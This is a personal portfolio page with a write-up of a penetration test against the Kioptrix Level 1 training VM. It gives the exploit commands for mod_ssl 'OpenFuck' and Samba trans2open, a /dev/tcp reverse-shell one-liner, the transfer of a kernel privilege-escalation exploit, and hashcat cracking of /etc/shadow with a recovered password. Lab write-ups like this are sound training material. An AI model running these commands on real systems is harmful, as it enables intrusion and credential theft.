<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Kioptrix Level 1 Penetration Testing | Mahmoud Tamer</title>
    <meta name="description" content="A detailed penetration testing report of Kioptrix Level 1 VM, showcasing vulnerability identification and exploitation techniques." />
    <meta property="og:title" content="Kioptrix Level 1 Penetration Testing | Mahmoud Tamer" />
    <meta property="og:description" content="A detailed penetration testing report of Kioptrix Level 1 VM, showcasing vulnerability identification and exploitation techniques." />
    <meta property="og:type" content="article" />
    <meta
      property="og:url"
      content="https://mahmoudtamerali.github.io/labs/kioptrix-level-1-penetration-testing.html"
    />
    <meta
      property="og:image"
      content="https://picsum.photos/seed/kioptrix1/1200/630.jpg"
    />
    <link rel="icon" href="/favicon.ico" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
    />
    <link rel="stylesheet" href="/assets/css/common.css" />
    <link rel="stylesheet" href="/assets/css/lab.css" />
  </head>
  <body>
    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
      <div class="loader"></div>
    </div>
    <!-- Skip to content link for accessibility -->
    <a href="#main-content" class="skip-link">Skip to main content</a>
    <!-- Navigation -->
    <nav role="navigation" aria-label="Main navigation">
      <div class="container nav-container">
        <a href="/" class="logo" aria-label="Mahmoud Tamer Home">MT</a>
        <ul class="nav-links" id="navLinks">
          <li><a href="/#home" class="nav-link">Home</a></li>
          <li><a href="/#about" class="nav-link">About</a></li>
          <li><a href="/#skills" class="nav-link">Skills</a></li>
          <li><a href="/#featured-projects" class="nav-link">Projects</a></li>
          <li><a href="/#featured-labs" class="nav-link active">Labs</a></li>
          <li><a href="/#certificates" class="nav-link">Certificates</a></li>
          <li><a href="/#writeups" class="nav-link">Writeups</a></li>
          <li><a href="/#contact" class="nav-link">Contact</a></li>
        </ul>
        <button
          class="mobile-menu-btn"
          id="mobileMenuBtn"
          aria-label="Toggle navigation menu"
          aria-expanded="false"
        >
          <i class="fas fa-bars"></i>
        </button>
      </div>
    </nav>
    <!-- Lab Header -->
    <header class="lab-header">
      <div class="container lab-header-content">
        <div class="lab-header-text">
          <h1>Kioptrix Level 1 Penetration Testing</h1>
          <p>Penetration testing of Kioptrix Level 1 VM with multiple exploitation paths leading to root access.</p>
          <div class="lab-meta">
            <span class="lab-category">Penetration Testing</span>
            <span class="lab-difficulty">Medium</span>
          </div>
        </div>
      </div>
    </header>
    <!-- Lab Detail Section -->
    <main id="main-content" class="lab-detail">
      <div class="container">
        <div class="lab-detail-grid">
          <div class="lab-main-content">
            <!-- Executive Summary -->
            <section id="executive-summary" class="lab-section">
              <h2>Executive Summary</h2>
              <p>This report details my successful penetration testing of Kioptrix Level 1, a deliberately vulnerable virtual machine designed for security training. The assessment identified multiple critical vulnerabilities that led to complete system compromise. Through systematic reconnaissance, enumeration, and exploitation, I gained initial access as the low-privilege 'apache' user and escalated privileges to root. The assessment demonstrates how outdated software components and missing security patches can lead to full system compromise.</p>
            </section>

            <!-- Scope and Objectives -->
            <section id="scope-objectives" class="lab-section">
              <h2>Scope and Objectives</h2>
              <p><strong>Target:</strong> Kioptrix Level 1 VM (IP: 192.168.149.143)</p>
              <p><strong>Objective:</strong> Identify and exploit security vulnerabilities to gain unauthorized access and escalate privileges</p>
              <p><strong>Testing Period:</strong> September 4, 2025</p>
              <p><strong>Testing Approach:</strong> Black-box penetration testing with no prior knowledge of the system</p>
            </section>

            <!-- Methodology -->
            <section id="methodology" class="lab-section">
              <h2>Methodology</h2>
              <p>My testing followed a structured approach aligned with industry-standard penetration testing methodologies:</p>
              <ol>
                <li><strong>Reconnaissance</strong>: Host discovery and service enumeration</li>
                <li><strong>Enumeration</strong>: Directory and service vulnerability identification</li>
                <li><strong>Exploitation</strong>: Leveraging identified vulnerabilities to gain access</li>
                <li><strong>Post-Exploitation</strong>: Privilege escalation and data extraction</li>
                <li><strong>Alternative Attack Paths</strong>: Testing additional exploitation vectors</li>
              </ol>
            </section>

            <!-- Technical Findings -->
            <section id="technical-findings" class="lab-section">
              <h2>Technical Findings</h2>
              
              <h3>1. Reconnaissance Results</h3>
              <h4>Host Discovery</h4>
              <p>Using Nmap, I identified the target system at IP 192.168.149.143 within the 192.168.149.0/24 network:</p>
              <pre><code>nmap -sn 192.168.149.0/24</code></pre>
              <img src="/images/kiopetrix_1/image.png" alt="Nmap host discovery results" onclick="openModal(this.src)" />
              <p>Five hosts were identified, with 192.168.149.143 selected as the target based on a process of elimination, as the other IPs were known to be infrastructure and host IP.</p>

              <h4>Port and Service Enumeration</h4>
              <p>A comprehensive scan with nmap revealed six open services:</p>
              <pre><code>nmap -sV 192.168.149.143 -O</code></pre>
              <img src="/images/kiopetrix_1/image 1.png" alt="Nmap port scan results" onclick="openModal(this.src)" />
              <table>
                <thead>
                  <tr>
                    <th>Port</th>
                    <th>Service</th>
                    <th>Version</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td>22</td>
                    <td>SSH</td>
                    <td>OpenSSH 2.9p2 (protocol 1.99)</td>
                  </tr>
                  <tr>
                    <td>80</td>
                    <td>HTTP</td>
                    <td>Apache 1.3.20 with mod_ssl/2.8.4</td>
                  </tr>
                  <tr>
                    <td>111</td>
                    <td>rpcbind</td>
                    <td>2 (RPC #100000)</td>
                  </tr>
                  <tr>
                    <td>139</td>
                    <td>Samba</td>
                    <td>smbd (workgroup: MYGROUP)</td>
                  </tr>
                  <tr>
                    <td>443</td>
                    <td>HTTPS</td>
                    <td>Apache 1.3.20 with mod_ssl/2.8.4</td>
                  </tr>
                  <tr>
                    <td>1024</td>
                    <td>status</td>
                    <td>1 (RPC #100024)</td>
                  </tr>
                </tbody>
              </table>
              <p><strong>OS Detection:</strong> Linux 2.4.x (Red-Hat based).</p>

              <h3>2. Enumeration Results</h3>
              <h4>Web Application Analysis</h4>
              <p>The HTTP server displayed a default Apache page, which was not interesting. Directory enumeration with Dirb revealed several interesting paths:</p>
              <img src="/images/kiopetrix_1/image 2.png" alt="Dirb directory enumeration results" onclick="openModal(this.src)" />
              <ul>
                <li><code>/cgi-bin/</code> (403 Forbidden)</li>
                <li><code>/~operator</code> (403 Forbidden)</li>
                <li><code>/~root</code> (403 Forbidden)</li>
                <li><code>/manual/</code>, <code>/mrtg/</code>, <code>/usage/</code> (accessible directories)</li>
              </ul>
              <p>I tried basic authorization bypass, but it seems that everything is default, so I will look for Apache vulnerabilities.</p>

              <h4>Vulnerability Identification</h4>
              <ul>
                <li><strong>Apache/mod_ssl:</strong> Version 1.3.20/2.8.4 has known critical vulnerabilities (CVE-2002-0082)</li>
                <img src="/images/kiopetrix_1/image 3.png" alt="Apache vulnerability search" onclick="openModal(this.src)" />
                <li><strong>Samba:</strong> Version vulnerable to trans2open exploit</li>
                <p>I enumerated the version of SMB service first using metasploit and it was 2.2.1</p>
                <img src="/images/kiopetrix_1/image 4.png" alt="SMB version enumeration" onclick="openModal(this.src)" />
                <p>after getting SMB version I searched on goolge for exploit and i found trans2open</p>
                <img src="/images/kiopetrix_1/image 5.png" alt="Trans2open exploit search" onclick="openModal(this.src)" />
                <li><strong>SSH:</strong> Version 2.9p2 has multiple documented vulnerabilities, but I couldn't get exploit code or POC.</li>
                <li><strong>Kernel:</strong> Linux 2.4.x vulnerable to ptrace/kmod local privilege escalation (will be needed with the apache vulnerability)</li>
                <img src="/images/kiopetrix_1/image 6.png" alt="Kernel vulnerability search" onclick="openModal(this.src)" />
              </ul>
              <p>overall i used Google, searchsploit, Metasploit, and also ChatGPT to search for vulnerabilities</p>

              <h3>3. Exploitation</h3>
              <h4>Initial Access via mod_ssl Vulnerability (CVE-2002-0082)</h4>
              <p>I leveraged the "OpenFuck" exploit targeting the mod_ssl vulnerability:</p>
              <pre><code>./openfuck 0x6b 192.168.149.143</code></pre>
              <img src="/images/kiopetrix_1/image 7.png" alt="OpenFuck exploit execution" onclick="openModal(this.src)" />
              <p>After three attempts, I successfully obtained a shell as the 'apache' user. To stabilize the connection, I established a reverse shell (the session was continuously closing after some time):</p>
              <pre><code>sh -i >& /dev/tcp/192.168.149.139/9001 0>&1</code></pre>
              <p>I handled the session through metasploit for easier workframe and for post exploitation running.</p>
              <img src="/images/kiopetrix_1/image 8.png" alt="Metasploit session handling" onclick="openModal(this.src)" />
              <p>After gaining access, I ran <code>uname -a</code> to gather system information:</p>
              <pre><code>Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown</code></pre>
              <img src="/images/kiopetrix_1/image 9.png" alt="System information" onclick="openModal(this.src)" />

              <h4>Privilege Escalation</h4>
              <ol>
                <li><strong>System Enumeration:</strong>
                  <ul>
                    <li>I looked up users on the system and identified two user accounts: john and harold</li>
                    <img src="/images/kiopetrix_1/image 10.png" alt="User enumeration" onclick="openModal(this.src)" />
                    <li>Confirmed kernel version (Linux 2.4.7-10) vulnerable to ptrace/kmod exploit</li>
                  </ul>
                </li>
                <li><strong>Local Privilege Escalation:</strong>
                  <p>Utilized the ptrace/kmod vulnerability:</p>
                  <pre><code>searchsploit linux 2.4 escalation</code></pre>
                  <img src="/images/kiopetrix_1/image 11.png" alt="Searchsploit results" onclick="openModal(this.src)" />
                  <p>I made http server using python one line</p>
                  <pre><code>python -m http.server 8088</code></pre>
                  <p>transfered the file from the target device and compiled and executed the exploit to gain root privileges.</p>
                  <img src="/images/kiopetrix_1/image 12.png" alt="Privilege escalation" onclick="openModal(this.src)" />
                </li>
              </ol>

              <h4>Credential Harvesting</h4>
              <p>With root access, I extracted and cracked password hashes from /etc/shadow:</p>
              <pre><code>hashcat -m 500 -a 0 target.txt passwords/ignis-10M.txt</code></pre>
              <img src="/images/kiopetrix_1/image 13.png" alt="Hashcat password cracking" onclick="openModal(this.src)" />
              <p><strong>Result:</strong> Recovered credential for user harold: <code>harold:WebMaster</code></p>
              <p>but I couldn't crack other hashes as they need more time and better GPU.</p>

              <h3>4. Alternative Exploitation Path</h3>
              <h4>Samba trans2open Exploit</h4>
              <p>I also successfully exploited the Samba service using Metasploit:</p>
              <pre><code>use exploit/linux/samba/trans2open
set RHOSTS 192.168.149.143
set PAYLOAD linux/x86/shell_reverse_tcp
exploit</code></pre>
              <img src="/images/kiopetrix_1/image 14.png" alt="Samba exploit setup" onclick="openModal(this.src)" />
              <img src="/images/kiopetrix_1/image 15.png" alt="Samba exploit result" onclick="openModal(this.src)" />
              <p>The exploit didn't work at first, and I knew the issue was that the payload couldn't be Meterpreter, as the target is so old that Meterpreter can't support it, and thus, the session was dying continuously until I changed the payload to a normal reverse shell with no Meterpreter.</p>
              <p>This exploit provided direct root access, confirming multiple paths to complete system compromise.</p>
            </section>

            <!-- Vulnerabilities Summary -->
            <section id="vulnerabilities-summary" class="lab-section">
              <h2>Vulnerabilities Summary</h2>
              <table>
                <thead>
                  <tr>
                    <th>Vulnerability</th>
                    <th>Severity</th>
                    <th>Component</th>
                    <th>Impact</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td>mod_ssl Remote Code Execution (CVE-2002-0082)</td>
                    <td>Critical</td>
                    <td>Apache/mod_ssl</td>
                    <td>Remote code execution as apache user</td>
                  </tr>
                  <tr>
                    <td>Linux Kernel 2.4.x ptrace/kmod Privilege Escalation</td>
                    <td>Critical</td>
                    <td>Kernel</td>
                    <td>Root privilege escalation</td>
                  </tr>
                  <tr>
                    <td>Samba trans2open Remote Code Execution</td>
                    <td>Critical</td>
                    <td>Samba</td>
                    <td>Direct root access</td>
                  </tr>
                  <tr>
                    <td>OpenSSH 2.9p2 Multiple Vulnerabilities</td>
                    <td>High</td>
                    <td>SSH</td>
                    <td>Potential remote code execution (couldn't find POC)</td>
                  </tr>
                </tbody>
              </table>
            </section>

            <!-- Recommendations -->
            <section id="recommendations" class="lab-section">
              <h2>Recommendations</h2>
              <ol>
                <li><strong>Immediate Actions:</strong>
                  <ul>
                    <li>Upgrade Apache to a supported version (minimum 2.4.x)</li>
                    <li>Update Linux kernel to a current supported version</li>
                    <li>Upgrade Samba to the latest stable release</li>
                    <li>Replace OpenSSH 2.9p2 with a current version</li>
                  </ul>
                </li>
                <li><strong>Security Hardening:</strong>
                  <ul>
                    <li>Implement regular patching cycle for all services</li>
                    <li>Disable unnecessary services (rpcbind, status)</li>
                    <li>Restrict SMB access to authorized systems only</li>
                    <li>Implement strong password policies</li>
                    <li>Use modern password hashing algorithms (bcrypt, scrypt)</li>
                  </ul>
                </li>
                <li><strong>Monitoring:</strong>
                  <ul>
                    <li>Implement file integrity monitoring for critical system files</li>
                    <li>Configure intrusion detection system to detect exploit patterns</li>
                    <li>Regular vulnerability scanning and penetration testing</li>
                  </ul>
                </li>
              </ol>
            </section>

            <!-- Conclusion -->
            <section id="conclusion" class="lab-section">
              <h2>Conclusion</h2>
              <p>The Kioptrix Level 1 system was successfully compromised through multiple attack vectors, demonstrating the critical risks associated with outdated software components. The assessment highlights the importance of regular patching and system updates. All identified vulnerabilities should be addressed immediately to prevent potential security incidents.</p>
              
              <div class="report-footer">
                <p><strong>Assessment Team:</strong> Security Analyst</p>
                <p><strong>Report Date:</strong> September 4, 2025</p>
                <p><strong>Classification:</strong> Confidential</p>
                <p>This report contains sensitive security information and should be handled according to organizational data classification policies.</p>
              </div>
            </section>
          </div>
          
          <aside class="lab-sidebar">
            <div class="sidebar-section">
              <h3>Lab Details</h3>
              <ul class="lab-details-list">
                <li>
                  <span class="detail-label">Duration:</span>
                  <span class="detail-value">4 hours</span>
                </li>
                <li>
                  <span class="detail-label">Difficulty:</span>
                  <span class="detail-value">Medium</span>
                </li>
                <li>
                  <span class="detail-label">Platform:</span>
                  <span class="detail-value">Kioptrix Level 1 VM</span>
                </li>
                <li>
                  <span class="detail-label">Tools:</span>
                  <span class="detail-value">Nmap, Metasploit, OpenFuck, Hashcat, Dirb</span>
                </li>
              </ul>
            </div>
            
            <div class="sidebar-section">
              <h3>Technologies Used</h3>
              <div class="tech-tags">
                <span class="tech-tag">Linux</span>
                <span class="tech-tag">Apache</span>
                <span class="tech-tag">Samba</span>
                <span class="tech-tag">OpenSSH</span>
                <span class="tech-tag">mod_ssl</span>
              </div>
            </div>
            
          </aside>
        </div>
      </div>
    </main>
    <!-- Footer -->
    <footer role="contentinfo">
      <div class="container">
        <div class="social-links">
          <a
            href="https://linkedin.com/in/mahmoud-tamer"
            target="_blank"
            rel="noopener noreferrer"
            aria-label="LinkedIn"
          >
            <i class="fab fa-linkedin"></i>
          </a>
          <a
            href="https://github.com/mahmoudtamerali"
            target="_blank"
            rel="noopener noreferrer"
            aria-label="GitHub"
          >
            <i class="fab fa-github"></i>
          </a>
          <a
            href="https://tryhackme.com/p/mahmoud.tamer"
            target="_blank"
            rel="noopener noreferrer"
            aria-label="TryHackMe"
          >
            <i class="fas fa-user-secret"></i>
          </a>
        </div>
        <p>Â© 2023 Mahmoud Tamer. All rights reserved.</p>
        <p>
          Designed and built with
          <i class="fas fa-heart" style="color: #e63946" aria-hidden="true"></i>
          for cybersecurity
        </p>
      </div>
    </footer>
    <!-- Modal -->
    <div
      id="modal"
      class="modal"
      onclick="closeModal()"
      role="dialog"
      aria-modal="true"
      aria-labelledby="modal-title"
    >
      <button
        class="modal-close"
        onclick="closeModal()"
        aria-label="Close modal"
      >
        &times;
      </button>
      <img id="modal-img" src="" alt="Lab preview" />
    </div>
    <!-- Back to top button -->
    <button class="back-to-top" id="backToTop" aria-label="Back to top">
      <i class="fas fa-arrow-up"></i>
    </button>
    <!-- Toast notification -->
    <div class="toast" id="toast" role="alert" aria-live="assertive"></div>
    <script>
      // Function to hide loading screen
      function hideLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) {
          loadingScreen.classList.add("hidden");
        }
      }
      // Hide loading screen when page is fully loaded
      window.addEventListener("load", function () {
        setTimeout(hideLoadingScreen, 2000);
        hideLoadingScreen();
        document.querySelectorAll("section").forEach((section) => {
          section.classList.add("visible");
        });
      });
      // Also hide loading screen after DOM is loaded (as a backup)
      document.addEventListener("DOMContentLoaded", function () {
        setTimeout(hideLoadingScreen, 500);
      });
    </script>
  </body>
</html>